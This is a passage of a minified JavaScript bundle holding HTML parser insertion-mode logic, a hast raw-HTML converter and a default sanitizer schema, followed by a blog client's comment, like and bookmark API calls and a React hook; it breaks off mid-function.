t=e.openElements.tmplCount>0,{formElement:n}=e;t||(e.formElement=null),(n||t)&&e.openElements.hasInScope(v.FORM)&&(e.openElements.generateImpliedEndTags(),t?e.openElements.popUntilTagNamePopped(v.FORM):n&&e.openElements.remove(n))}function I9(e){e.openElements.hasInButtonScope(v.P)||e._insertFakeElement(ce.P,v.P),e._closePElement()}function P9(e){e.openElements.hasInListItemScope(v.LI)&&(e.openElements.generateImpliedEndTagsWithExclusion(v.LI),e.openElements.popUntilTagNamePopped(v.LI))}function j9(e,t){const n=t.tagID;e.openElements.hasInScope(n)&&(e.openElements.generateImpliedEndTagsWithExclusion(n),e.openElements.popUntilTagNamePopped(n))}function R9(e){e.openElements.hasNumberedHeaderInScope()&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilNumberedHeaderPopped())}function O9(e,t){const n=t.tagID;e.openElements.hasInScope(n)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(n),e.activeFormattingElements.clearToLastMarker())}function F9(e){e._reconstructActiveFormattingElements(),e._insertFakeElement(ce.BR,v.BR),e.openElements.pop(),e.framesetOk=!1}function bC(e,t){const n=t.tagName,r=t.tagID;for(let a=e.openElements.stackTop;a>0;a--){const l=e.openElements.items[a],u=e.openElements.tagIDs[a];if(r===u&&(r!==v.UNKNOWN||e.treeAdapter.getTagName(l)===n)){e.openElements.generateImpliedEndTagsWithExclusion(r),e.openElements.stackTop>=a&&e.openElements.shortenToLength(a);break}if(e._isSpecialElement(l,u))break}}function xh(e,t){switch(t.tagID){case v.A:case v.B:case v.I:case v.S:case v.U:case v.EM:case v.TT:case v.BIG:case v.CODE:case v.FONT:case v.NOBR:case v.SMALL:case v.STRIKE:case v.STRONG:{Sx(e,t);break}case v.P:{I9(e);break}case v.DL:case v.UL:case v.OL:case v.DIR:case v.DIV:case v.NAV:case v.PRE:case v.MAIN:case v.MENU:case v.ASIDE:case v.BUTTON:case v.CENTER:case v.FIGURE:case v.FOOTER:case v.HEADER:case v.HGROUP:case v.DIALOG:case v.ADDRESS:case v.ARTICLE:case v.DETAILS:case v.SEARCH:case v.SECTION:case v.SUMMARY:case v.LISTING:case v.FIELDSET:case v.BLOCKQUOTE:case v.FIGCAPTION:{L9(e,t);break}case v.LI:{P9(e);break}case v.DD:case v.DT:{j9(e,t);break}case v.H1:case v.H2:case v.H3:case v.H4:case v.H5:case v.H6:{R9(e);break}case v.BR:{F9(e);break}case v.BODY:{A9(e,t);break}case v.HTML:{D9(e,t);break}case v.FORM:{_9(e);break}case v.APPLET:case v.OBJECT:case v.MARQUEE:{O9(e,t);break}case v.TEMPLATE:{ws(e,t);break}default:bC(e,t)}}function EC(e,t){e.tmplInsertionModeStack.length>0?AC(e,t):Nx(e,t)}function M9(e,t){var n;t.tagID===v.SCRIPT&&((n=e.scriptHandler)===null||n===void 0||n.call(e,e.openElements.current)),e.openElements.pop(),e.insertionMode=e.originalInsertionMode}function B9(e,t){e._err(t,he.eofInElementThatCanContainOnlyText),e.openElements.pop(),e.insertionMode=e.originalInsertionMode,e.onEof(t)}function vm(e,t){if(e.openElements.currentTagId!==void 0&&mC.has(e.openElements.currentTagId))switch(e.pendingCharacterTokens.length=0,e.hasNonWhitespacePendingCharacterToken=!1,e.originalInsertionMode=e.insertionMode,e.insertionMode=ee.IN_TABLE_TEXT,t.type){case ot.CHARACTER:{kC(e,t);break}case ot.WHITESPACE_CHARACTER:{wC(e,t);break}}else ac(e,t)}function H9(e,t){e.openElements.clearBackToTableContext(),e.activeFormattingElements.insertMarker(),e._insertElement(t,be.HTML),e.insertionMode=ee.IN_CAPTION}function U9(e,t){e.openElements.clearBackToTableContext(),e._insertElement(t,be.HTML),e.insertionMode=ee.IN_COLUMN_GROUP}function z9(e,t){e.openElements.clearBackToTableContext(),e._insertFakeElement(ce.COLGROUP,v.COLGROUP),e.insertionMode=ee.IN_COLUMN_GROUP,Ax(e,t)}function W9(e,t){e.openElements.clearBackToTableContext(),e._insertElement(t,be.HTML),e.insertionMode=ee.IN_TABLE_BODY}function q9(e,t){e.openElements.clearBackToTableContext(),e._insertFakeElement(ce.TBODY,v.TBODY),e.insertionMode=ee.IN_TABLE_BODY,yh(e,t)}function $9(e,t){e.openElements.hasInTableScope(v.TABLE)&&(e.openElements.popUntilTagNamePopped(v.TABLE),e._resetInsertionMode(),e._processStartTag(t))}function Y9(e,t){vC(t)?e._appendElement(t,be.HTML):ac(e,t),t.ackSelfClosing=!0}function V9(e,t){!e.formElement&&e.openElements.tmplCount===0&&(e._insertElement(t,be.HTML),e.formElement=e.openElements.current,e.openElements.pop())}function _l(e,t){switch(t.tagID){case v.TD:case v.TH:case v.TR:{q9(e,t);break}case v.STYLE:case v.SCRIPT:case v.TEMPLATE:{Jr(e,t);break}case v.COL:{z9(e,t);break}case v.FORM:{V9(e,t);break}case v.TABLE:{$9(e,t);break}case v.TBODY:case v.TFOOT:case v.THEAD:{W9(e,t);break}case v.INPUT:{Y9(e,t);break}case v.CAPTION:{H9(e,t);break}case v.COLGROUP:{U9(e,t);break}default:ac(e,t)}}function Hu(e,t){switch(t.tagID){case v.TABLE:{e.openElements.hasInTableScope(v.TABLE)&&(e.openElements.popUntilTagNamePopped(v.TABLE),e._resetInsertionMode());break}case v.TEMPLATE:{ws(e,t);break}case v.BODY:case v.CAPTION:case v.COL:case v.COLGROUP:case v.HTML:case v.TBODY:case v.TD:case v.TFOOT:case v.TH:case v.THEAD:case v.TR:break;default:ac(e,t)}}function ac(e,t){const n=e.fosterParentingEnabled;e.fosterParentingEnabled=!0,gh(e,t),e.fosterParentingEnabled=n}function wC(e,t){e.pendingCharacterTokens.push(t)}function kC(e,t){e.pendingCharacterTokens.push(t),e.hasNonWhitespacePendingCharacterToken=!0}function Ho(e,t){let n=0;if(e.hasNonWhitespacePendingCharacterToken)for(;n<e.pendingCharacterTokens.length;n++)ac(e,e.pendingCharacterTokens[n]);else for(;n<e.pendingCharacterTokens.length;n++)e._insertCharacters(e.pendingCharacterTokens[n]);e.insertionMode=e.originalInsertionMode,e._processToken(t)}const TC=new Set([v.CAPTION,v.COL,v.COLGROUP,v.TBODY,v.TD,v.TFOOT,v.TH,v.THEAD,v.TR]);function G9(e,t){const n=t.tagID;TC.has(n)?e.openElements.hasInTableScope(v.CAPTION)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(v.CAPTION),e.activeFormattingElements.clearToLastMarker(),e.insertionMode=ee.IN_TABLE,_l(e,t)):Bn(e,t)}function Q9(e,t){const n=t.tagID;switch(n){case v.CAPTION:case v.TABLE:{e.openElements.hasInTableScope(v.CAPTION)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(v.CAPTION),e.activeFormattingElements.clearToLastMarker(),e.insertionMode=ee.IN_TABLE,n===v.TABLE&&Hu(e,t));break}case v.BODY:case v.COL:case v.COLGROUP:case v.HTML:case v.TBODY:case v.TD:case v.TFOOT:case v.TH:case v.THEAD:case v.TR:break;default:xh(e,t)}}function Ax(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.COL:{e._appendElement(t,be.HTML),t.ackSelfClosing=!0;break}case v.TEMPLATE:{Jr(e,t);break}default:yf(e,t)}}function K9(e,t){switch(t.tagID){case v.COLGROUP:{e.openElements.currentTagId===v.COLGROUP&&(e.openElements.pop(),e.insertionMode=ee.IN_TABLE);break}case v.TEMPLATE:{ws(e,t);break}case v.COL:break;default:yf(e,t)}}function yf(e,t){e.openElements.currentTagId===v.COLGROUP&&(e.openElements.pop(),e.insertionMode=ee.IN_TABLE,e._processToken(t))}function yh(e,t){switch(t.tagID){case v.TR:{e.openElements.clearBackToTableBodyContext(),e._insertElement(t,be.HTML),e.insertionMode=ee.IN_ROW;break}case v.TH:case v.TD:{e.openElements.clearBackToTableBodyContext(),e._insertFakeElement(ce.TR,v.TR),e.insertionMode=ee.IN_ROW,vh(e,t);break}case v.CAPTION:case v.COL:case v.COLGROUP:case v.TBODY:case v.TFOOT:case v.THEAD:{e.openElements.hasTableBodyContextInTableScope()&&(e.openElements.clearBackToTableBodyContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE,_l(e,t));break}default:_l(e,t)}}function U0(e,t){const n=t.tagID;switch(t.tagID){case v.TBODY:case v.TFOOT:case v.THEAD:{e.openElements.hasInTableScope(n)&&(e.openElements.clearBackToTableBodyContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE);break}case v.TABLE:{e.openElements.hasTableBodyContextInTableScope()&&(e.openElements.clearBackToTableBodyContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE,Hu(e,t));break}case v.BODY:case v.CAPTION:case v.COL:case v.COLGROUP:case v.HTML:case v.TD:case v.TH:case v.TR:break;default:Hu(e,t)}}function vh(e,t){switch(t.tagID){case v.TH:case v.TD:{e.openElements.clearBackToTableRowContext(),e._insertElement(t,be.HTML),e.insertionMode=ee.IN_CELL,e.activeFormattingElements.insertMarker();break}case v.CAPTION:case v.COL:case v.COLGROUP:case v.TBODY:case v.TFOOT:case v.THEAD:case v.TR:{e.openElements.hasInTableScope(v.TR)&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE_BODY,yh(e,t));break}default:_l(e,t)}}function CC(e,t){switch(t.tagID){case v.TR:{e.openElements.hasInTableScope(v.TR)&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE_BODY);break}case v.TABLE:{e.openElements.hasInTableScope(v.TR)&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE_BODY,U0(e,t));break}case v.TBODY:case v.TFOOT:case v.THEAD:{(e.openElements.hasInTableScope(t.tagID)||e.openElements.hasInTableScope(v.TR))&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=ee.IN_TABLE_BODY,U0(e,t));break}case v.BODY:case v.CAPTION:case v.COL:case v.COLGROUP:case v.HTML:case v.TD:case v.TH:break;default:Hu(e,t)}}function X9(e,t){const n=t.tagID;TC.has(n)?(e.openElements.hasInTableScope(v.TD)||e.openElements.hasInTableScope(v.TH))&&(e._closeTableCell(),vh(e,t)):Bn(e,t)}function Z9(e,t){const n=t.tagID;switch(n){case v.TD:case v.TH:{e.openElements.hasInTableScope(n)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(n),e.activeFormattingElements.clearToLastMarker(),e.insertionMode=ee.IN_ROW);break}case v.TABLE:case v.TBODY:case v.TFOOT:case v.THEAD:case v.TR:{e.openElements.hasInTableScope(n)&&(e._closeTableCell(),CC(e,t));break}case v.BODY:case v.CAPTION:case v.COL:case v.COLGROUP:case v.HTML:break;default:xh(e,t)}}function SC(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.OPTION:{e.openElements.currentTagId===v.OPTION&&e.openElements.pop(),e._insertElement(t,be.HTML);break}case v.OPTGROUP:{e.openElements.currentTagId===v.OPTION&&e.openElements.pop(),e.openElements.currentTagId===v.OPTGROUP&&e.openElements.pop(),e._insertElement(t,be.HTML);break}case v.HR:{e.openElements.currentTagId===v.OPTION&&e.openElements.pop(),e.openElements.currentTagId===v.OPTGROUP&&e.openElements.pop(),e._appendElement(t,be.HTML),t.ackSelfClosing=!0;break}case v.INPUT:case v.KEYGEN:case v.TEXTAREA:case v.SELECT:{e.openElements.hasInSelectScope(v.SELECT)&&(e.openElements.popUntilTagNamePopped(v.SELECT),e._resetInsertionMode(),t.tagID!==v.SELECT&&e._processStartTag(t));break}case v.SCRIPT:case v.TEMPLATE:{Jr(e,t);break}}}function NC(e,t){switch(t.tagID){case v.OPTGROUP:{e.openElements.stackTop>0&&e.openElements.currentTagId===v.OPTION&&e.openElements.tagIDs[e.openElements.stackTop-1]===v.OPTGROUP&&e.openElements.pop(),e.openElements.currentTagId===v.OPTGROUP&&e.openElements.pop();break}case v.OPTION:{e.openElements.currentTagId===v.OPTION&&e.openElements.pop();break}case v.SELECT:{e.openElements.hasInSelectScope(v.SELECT)&&(e.openElements.popUntilTagNamePopped(v.SELECT),e._resetInsertionMode());break}case v.TEMPLATE:{ws(e,t);break}}}function J9(e,t){const n=t.tagID;n===v.CAPTION||n===v.TABLE||n===v.TBODY||n===v.TFOOT||n===v.THEAD||n===v.TR||n===v.TD||n===v.TH?(e.openElements.popUntilTagNamePopped(v.SELECT),e._resetInsertionMode(),e._processStartTag(t)):SC(e,t)}function eB(e,t){const n=t.tagID;n===v.CAPTION||n===v.TABLE||n===v.TBODY||n===v.TFOOT||n===v.THEAD||n===v.TR||n===v.TD||n===v.TH?e.openElements.hasInTableScope(n)&&(e.openElements.popUntilTagNamePopped(v.SELECT),e._resetInsertionMode(),e.onEndTag(t)):NC(e,t)}function tB(e,t){switch(t.tagID){case v.BASE:case v.BASEFONT:case v.BGSOUND:case v.LINK:case v.META:case v.NOFRAMES:case v.SCRIPT:case v.STYLE:case v.TEMPLATE:case v.TITLE:{Jr(e,t);break}case v.CAPTION:case v.COLGROUP:case v.TBODY:case v.TFOOT:case v.THEAD:{e.tmplInsertionModeStack[0]=ee.IN_TABLE,e.insertionMode=ee.IN_TABLE,_l(e,t);break}case v.COL:{e.tmplInsertionModeStack[0]=ee.IN_COLUMN_GROUP,e.insertionMode=ee.IN_COLUMN_GROUP,Ax(e,t);break}case v.TR:{e.tmplInsertionModeStack[0]=ee.IN_TABLE_BODY,e.insertionMode=ee.IN_TABLE_BODY,yh(e,t);break}case v.TD:case v.TH:{e.tmplInsertionModeStack[0]=ee.IN_ROW,e.insertionMode=ee.IN_ROW,vh(e,t);break}default:e.tmplInsertionModeStack[0]=ee.IN_BODY,e.insertionMode=ee.IN_BODY,Bn(e,t)}}function nB(e,t){t.tagID===v.TEMPLATE&&ws(e,t)}function AC(e,t){e.openElements.tmplCount>0?(e.openElements.popUntilTagNamePopped(v.TEMPLATE),e.activeFormattingElements.clearToLastMarker(),e.tmplInsertionModeStack.shift(),e._resetInsertionMode(),e.onEof(t)):Nx(e,t)}function rB(e,t){t.tagID===v.HTML?Bn(e,t):vf(e,t)}function DC(e,t){var n;if(t.tagID===v.HTML){if(e.fragmentContext||(e.insertionMode=ee.AFTER_AFTER_BODY),e.options.sourceCodeLocationInfo&&e.openElements.tagIDs[0]===v.HTML){e._setEndLocation(e.openElements.items[0],t);const r=e.openElements.items[1];r&&!(!((n=e.treeAdapter.getNodeSourceCodeLocation(r))===null||n===void 0)&&n.endTag)&&e._setEndLocation(r,t)}}else vf(e,t)}function vf(e,t){e.insertionMode=ee.IN_BODY,gh(e,t)}function iB(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.FRAMESET:{e._insertElement(t,be.HTML);break}case v.FRAME:{e._appendElement(t,be.HTML),t.ackSelfClosing=!0;break}case v.NOFRAMES:{Jr(e,t);break}}}function aB(e,t){t.tagID===v.FRAMESET&&!e.openElements.isRootHtmlElementCurrent()&&(e.openElements.pop(),!e.fragmentContext&&e.openElements.currentTagId!==v.FRAMESET&&(e.insertionMode=ee.AFTER_FRAMESET))}function sB(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.NOFRAMES:{Jr(e,t);break}}}function lB(e,t){t.tagID===v.HTML&&(e.insertionMode=ee.AFTER_AFTER_FRAMESET)}function oB(e,t){t.tagID===v.HTML?Bn(e,t):jd(e,t)}function jd(e,t){e.insertionMode=ee.IN_BODY,gh(e,t)}function uB(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.NOFRAMES:{Jr(e,t);break}}}function cB(e,t){t.chars=Ut,e._insertCharacters(t)}function dB(e,t){e._insertCharacters(t),e.framesetOk=!1}function LC(e){for(;e.treeAdapter.getNamespaceURI(e.openElements.current)!==be.HTML&&e.openElements.currentTagId!==void 0&&!e._isIntegrationPoint(e.openElements.currentTagId,e.openElements.current);)e.openElements.pop()}function fB(e,t){if(NM(t))LC(e),e._startTagOutsideForeignContent(t);else{const n=e._getAdjustedCurrentElement(),r=e.treeAdapter.getNamespaceURI(n);r===be.MATHML?hC(t):r===be.SVG&&(AM(t),pC(t)),Cx(t),t.selfClosing?e._appendElement(t,r):e._insertElement(t,r),t.ackSelfClosing=!0}}function hB(e,t){if(t.tagID===v.P||t.tagID===v.BR){LC(e),e._endTagOutsideForeignContent(t);return}for(let n=e.openElements.stackTop;n>0;n--){const r=e.openElements.items[n];if(e.treeAdapter.getNamespaceURI(r)===be.HTML){e._endTagOutsideForeignContent(t);break}const a=e.treeAdapter.getTagName(r);if(a.toLowerCase()===t.tagName){t.tagName=a,e.openElements.shortenToLength(n);break}}}ce.AREA,ce.BASE,ce.BASEFONT,ce.BGSOUND,ce.BR,ce.COL,ce.EMBED,ce.FRAME,ce.HR,ce.IMG,ce.INPUT,ce.KEYGEN,ce.LINK,ce.META,ce.PARAM,ce.SOURCE,ce.TRACK,ce.WBR;const pB=/<(\/?)(iframe|noembed|noframes|plaintext|script|style|textarea|title|xmp)(?=[\t\n\f\r />])/gi,mB=new Set(["mdxFlowExpression","mdxJsxFlowElement","mdxJsxTextElement","mdxTextExpression","mdxjsEsm"]),k2={sourceCodeLocationInfo:!0,scriptingEnabled:!1};function _C(e,t){const n=CB(e),r=CT("type",{handlers:{root:gB,element:xB,text:yB,comment:PC,doctype:vB,raw:EB},unknown:wB}),a={parser:n?new b2(k2):b2.getFragmentParser(void 0,k2),handle(f){r(f,a)},stitches:!1,options:t||{}};r(e,a),Vl(a,fi());const l=n?a.parser.document:a.parser.getFragment(),u=gF(l,{file:a.options.file});return a.stitches&&mh(u,"comment",function(f,h,m){const x=f;if(x.value.stitch&&m&&h!==void 0){const g=m.children;return g[h]=x.value.stitch,h}}),u.type==="root"&&u.children.length===1&&u.children[0].type===e.type?u.children[0]:u}function IC(e,t){let n=-1;if(e)for(;++n<e.length;)t.handle(e[n])}function gB(e,t){IC(e.children,t)}function xB(e,t){kB(e,t),IC(e.children,t),TB(e,t)}function yB(e,t){t.parser.tokenizer.state>4&&(t.parser.tokenizer.state=0);const n={type:ot.CHARACTER,chars:e.value,location:sc(e)};Vl(t,fi(e)),t.parser.currentToken=n,t.parser._processToken(t.parser.currentToken)}function vB(e,t){const n={type:ot.DOCTYPE,name:"html",forceQuirks:!1,publicId:"",systemId:"",location:sc(e)};Vl(t,fi(e)),t.parser.currentToken=n,t.parser._processToken(t.parser.currentToken)}function bB(e,t){t.stitches=!0;const n=SB(e);if("children"in e&&"children"in n){const r=_C({type:"root",children:e.children},t.options);n.children=r.children}PC({type:"comment",value:{stitch:n}},t)}function PC(e,t){const n=e.value,r={type:ot.COMMENT,data:n,location:sc(e)};Vl(t,fi(e)),t.parser.currentToken=r,t.parser._processToken(t.parser.currentToken)}function EB(e,t){if(t.parser.tokenizer.preprocessor.html="",t.parser.tokenizer.preprocessor.pos=-1,t.parser.tokenizer.preprocessor.lastGapPos=-2,t.parser.tokenizer.preprocessor.gapStack=[],t.parser.tokenizer.preprocessor.skipNextNewLine=!1,t.parser.tokenizer.preprocessor.lastChunkWritten=!1,t.parser.tokenizer.preprocessor.endOfChunkHit=!1,t.parser.tokenizer.preprocessor.isEol=!1,jC(t,fi(e)),t.parser.tokenizer.write(t.options.tagfilter?e.value.replace(pB,"&lt;$1$2"):e.value,!1),t.parser.tokenizer._runParsingLoop(),t.parser.tokenizer.state===72||t.parser.tokenizer.state===78){t.parser.tokenizer.preprocessor.lastChunkWritten=!0;const n=t.parser.tokenizer._consume();t.parser.tokenizer._callState(n)}}function wB(e,t){const n=e;if(t.options.passThrough&&t.options.passThrough.includes(n.type))bB(n,t);else{let r="";throw mB.has(n.type)&&(r=". It looks like you are using MDX nodes with `hast-util-raw` (or `rehype-raw`). If you use this because you are using remark or rehype plugins that inject `'html'` nodes, then please raise an issue with that plugin, as its a bad and slow idea. If you use this because you are using markdown syntax, then you have to configure this utility (or plugin) to pass through these nodes (see `passThrough` in docs), but you can also migrate to use the MDX syntax"),new Error("Cannot compile `"+n.type+"` node"+r)}}function Vl(e,t){jC(e,t);const n=e.parser.tokenizer.currentCharacterToken;n&&n.location&&(n.location.endLine=e.parser.tokenizer.preprocessor.line,n.location.endCol=e.parser.tokenizer.preprocessor.col+1,n.location.endOffset=e.parser.tokenizer.preprocessor.offset+1,e.parser.currentToken=n,e.parser._processToken(e.parser.currentToken)),e.parser.tokenizer.paused=!1,e.parser.tokenizer.inLoop=!1,e.parser.tokenizer.active=!1,e.parser.tokenizer.returnState=tn.DATA,e.parser.tokenizer.charRefCode=-1,e.parser.tokenizer.consumedAfterSnapshot=-1,e.parser.tokenizer.currentLocation=null,e.parser.tokenizer.currentCharacterToken=null,e.parser.tokenizer.currentToken=null,e.parser.tokenizer.currentAttr={name:"",value:""}}function jC(e,t){if(t&&t.offset!==void 0){const n={startLine:t.line,startCol:t.column,startOffset:t.offset,endLine:-1,endCol:-1,endOffset:-1};e.parser.tokenizer.preprocessor.lineStartPos=-t.column+1,e.parser.tokenizer.preprocessor.droppedBufferSize=t.offset,e.parser.tokenizer.preprocessor.line=t.line,e.parser.tokenizer.currentLocation=n}}function kB(e,t){const n=e.tagName.toLowerCase();if(t.parser.tokenizer.state===tn.PLAINTEXT)return;Vl(t,fi(e));const r=t.parser.openElements.current;let a="namespaceURI"in r?r.namespaceURI:is.html;a===is.html&&n==="svg"&&(a=is.svg);const l=_F({...e,children:[]},{space:a===is.svg?"svg":"html"}),u={type:ot.START_TAG,tagName:n,tagID:Yl(n),selfClosing:!1,ackSelfClosing:!1,attrs:"attrs"in l?l.attrs:[],location:sc(e)};t.parser.currentToken=u,t.parser._processToken(t.parser.currentToken),t.parser.tokenizer.lastStartTagName=n}function TB(e,t){const n=e.tagName.toLowerCase();if(!t.parser.tokenizer.inForeignNode&&BF.includes(n)||t.parser.tokenizer.state===tn.PLAINTEXT)return;Vl(t,uh(e));const r={type:ot.END_TAG,tagName:n,tagID:Yl(n),selfClosing:!1,ackSelfClosing:!1,attrs:[],location:sc(e)};t.parser.currentToken=r,t.parser._processToken(t.parser.currentToken),n===t.parser.tokenizer.lastStartTagName&&(t.parser.tokenizer.state===tn.RCDATA||t.parser.tokenizer.state===tn.RAWTEXT||t.parser.tokenizer.state===tn.SCRIPT_DATA)&&(t.parser.tokenizer.state=tn.DATA)}function CB(e){const t=e.type==="root"?e.children[0]:e;return!!(t&&(t.type==="doctype"||t.type==="element"&&t.tagName.toLowerCase()==="html"))}function sc(e){const t=fi(e)||{line:void 0,column:void 0,offset:void 0},n=uh(e)||{line:void 0,column:void 0,offset:void 0};return{startLine:t.line,startCol:t.column,startOffset:t.offset,endLine:n.line,endCol:n.column,endOffset:n.offset}}function SB(e){return"children"in e?xs({...e,children:[]}):xs(e)}function NB(e){return function(t,n){return _C(t,{...e,file:n})}}const Ka=["ariaDescribedBy","ariaLabel","ariaLabelledBy"],T2={ancestors:{tbody:["table"],td:["table"],th:["table"],thead:["table"],tfoot:["table"],tr:["table"]},attributes:{a:[...Ka,"dataFootnoteBackref","dataFootnoteRef",["className","data-footnote-backref"],"href"],blockquote:["cite"],code:[["className",/^language-./]],del:["cite"],div:["itemScope","itemType"],dl:[...Ka],h2:[["className","sr-only"]],img:[...Ka,"longDesc","src"],input:[["disabled",!0],["type","checkbox"]],ins:["cite"],li:[["className","task-list-item"]],ol:[...Ka,["className","contains-task-list"]],q:["cite"],section:["dataFootnotes",["className","footnotes"]],source:["srcSet"],summary:[...Ka],table:[...Ka],ul:[...Ka,["className","contains-task-list"]],"*":["abbr","accept","acceptCharset","accessKey","action","align","alt","axis","border","cellPadding","cellSpacing","char","charOff","charSet","checked","clear","colSpan","color","cols","compact","coords","dateTime","dir","encType","frame","hSpace","headers","height","hrefLang","htmlFor","id","isMap","itemProp","label","lang","maxLength","media","method","multiple","name","noHref","noShade","noWrap","open","prompt","readOnly","rev","rowSpan","rows","rules","scope","selected","shape","size","span","start","summary","tabIndex","title","useMap","vAlign","value","width"]},clobber:["ariaDescribedBy","ariaLabelledBy","id","name"],clobberPrefix:"user-content-",protocols:{cite:["http","https"],href:["http","https","irc","ircs","mailto","xmpp"],longDesc:["http","https"],src:["http","https"]},required:{input:{disabled:!0,type:"checkbox"}},strip:["script"],tagNames:["a","b","blockquote","br","code","dd","del","details","div","dl","dt","em","h1","h2","h3","h4","h5","h6","hr","i","img","input","ins","kbd","li","ol","p","picture","pre","q","rp","rt","ruby","s","samp","section","source","span","strike","strong","sub","summary","sup","table","tbody","td","tfoot","th","thead","tr","tt","ul","var"]},da={}.hasOwnProperty;function AB(e,t){let n={type:"root",children:[]};const r={schema:t?{...T2,...t}:T2,stack:[]},a=RC(r,e);return a&&(Array.isArray(a)?a.length===1?n=a[0]:n.children=a:n=a),n}function RC(e,t){if(t&&typeof t=="object"){const n=t;switch(typeof n.type=="string"?n.type:""){case"comment":return DB(e,n);case"doctype":return LB(e,n);case"element":return _B(e,n);case"root":return IB(e,n);case"text":return PB(e,n)}}}function DB(e,t){if(e.schema.allowComments){const n=typeof t.value=="string"?t.value:"",r=n.indexOf("-->"),l={type:"comment",value:r<0?n:n.slice(0,r)};return lc(l,t),l}}function LB(e,t){if(e.schema.allowDoctypes){const n={type:"doctype"};return lc(n,t),n}}function _B(e,t){const n=typeof t.tagName=="string"?t.tagName:"";e.stack.push(n);const r=OC(e,t.children),a=jB(e,t.properties);e.stack.pop();let l=!1;if(n&&n!=="*"&&(!e.schema.tagNames||e.schema.tagNames.includes(n))&&(l=!0,e.schema.ancestors&&da.call(e.schema.ancestors,n))){const f=e.schema.ancestors[n];let h=-1;for(l=!1;++h<f.length;)e.stack.includes(f[h])&&(l=!0)}if(!l)return e.schema.strip&&!e.schema.strip.includes(n)?r:void 0;const u={type:"element",tagName:n,properties:a,children:r};return lc(u,t),u}function IB(e,t){const r={type:"root",children:OC(e,t.children)};return lc(r,t),r}function PB(e,t){const r={type:"text",value:typeof t.value=="string"?t.value:""};return lc(r,t),r}function OC(e,t){const n=[];if(Array.isArray(t)){const r=t;let a=-1;for(;++a<r.length;){const l=RC(e,r[a]);l&&(Array.isArray(l)?n.push(...l):n.push(l))}}return n}function jB(e,t){const n=e.stack[e.stack.length-1],r=e.schema.attributes,a=e.schema.required,l=r&&da.call(r,n)?r[n]:void 0,u=r&&da.call(r,"*")?r["*"]:void 0,f=t&&typeof t=="object"?t:{},h={};let m;for(m in f)if(da.call(f,m)){const x=f[m];let g=C2(e,S2(l,m),m,x);g==null&&(g=C2(e,S2(u,m),m,x)),g!=null&&(h[m]=g)}if(a&&da.call(a,n)){const x=a[n];for(m in x)da.call(x,m)&&!da.call(h,m)&&(h[m]=x[m])}return h}function C2(e,t,n,r){return t?Array.isArray(r)?RB(e,t,n,r):FC(e,t,n,r):void 0}function RB(e,t,n,r){let a=-1;const l=[];for(;++a<r.length;){const u=FC(e,t,n,r[a]);(typeof u=="number"||typeof u=="string")&&l.push(u)}return l}function FC(e,t,n,r){if(!(typeof r!="boolean"&&typeof r!="number"&&typeof r!="string")&&OB(e,n,r)){if(typeof t=="object"&&t.length>1){let a=!1,l=0;for(;++l<t.length;){const u=t[l];if(u&&typeof u=="object"&&"flags"in u){if(u.test(String(r))){a=!0;break}}else if(u===r){a=!0;break}}if(!a)return}return e.schema.clobber&&e.schema.clobberPrefix&&e.schema.clobber.includes(n)?e.schema.clobberPrefix+r:r}}function OB(e,t,n){const r=e.schema.protocols&&da.call(e.schema.protocols,t)?e.schema.protocols[t]:void 0;if(!r||r.length===0)return!0;const a=String(n),l=a.indexOf(":"),u=a.indexOf("?"),f=a.indexOf("#"),h=a.indexOf("/");if(l<0||h>-1&&l>h||u>-1&&l>u||f>-1&&l>f)return!0;let m=-1;for(;++m<r.length;){const x=r[m];if(l===x.length&&a.slice(0,x.length)===x)return!0}return!1}function lc(e,t){const n=Yk(t);t.data&&(e.data=xs(t.data)),n&&(e.position=n)}function S2(e,t){let n,r=-1;if(e)for(;++r<e.length;){const a=e[r],l=typeof a=="string"?a:a[0];if(l===t)return a;l==="data*"&&(n=a)}if(t.length>4&&t.slice(0,4).toLowerCase()==="data")return n}function FB(e){return function(t){return AB(t,e)}}const MB=async e=>(await _e.get(`/api/posts/${e}/comments`)).data,N2=async(e,t)=>(await _e.post(`/api/posts/${e}/comments`,t)).data,BB=async(e,t)=>(await _e.patch(`/api/comments/${e}`,t)).data,HB=async e=>{await _e.delete(`/api/comments/${e}`)},UB=async e=>(await _e.post(`/api/posts/${e}/like`)).data,zB=async e=>(await _e.post(`/api/posts/${e}/bookmark`)).data,WB=async e=>(await _e.get(`/api/posts/${e}/status`)).data,qB=async(e=0,t=10,n="createdAt,desc")=>(await _e.get("/api/me/bookmarks",{params:{page:e,size:t,sort:n}})).data,MC=e=>{const[t,n]=j.useState({liked:!1,bookmarked:!1,likesCount:0,bookmarksCount:0,commentsCount:0}),[r,a]=j.useState(!1);j.useEffect(()=>{e&&l()},[e]);const l=async()=>{try{const x=await WB(e);n(x)}catch(x){console.error("Failed to load interaction status:",x)}},u=async()=>{if(r)return;a(!0);const x={...t};n(g=>({...g,liked:!g.liked,likesCount:g.liked?g.likesCount-1:g.likesCount+1}));try{const g=await UB(e);console.log("[Like] Server response:",g),n(b=>({...b,...g}))}catch(g){console.error("Failed to toggle like:",g),n(x)}finally{a(!1)}},f=async()=>{if(r)return;a(!0);const x={...t};n(g=>({...g,bookmarked:!g.bookmarked,bookmarksCount:g.bookmarked?g.bookmarksCount-1:g.bookmarksCount+1}));try{const g=await zB(e);console.log("[Bookmark] Server response:",g),n(b=>({...b,...g}))}catch(g){console.error("Failed to toggle 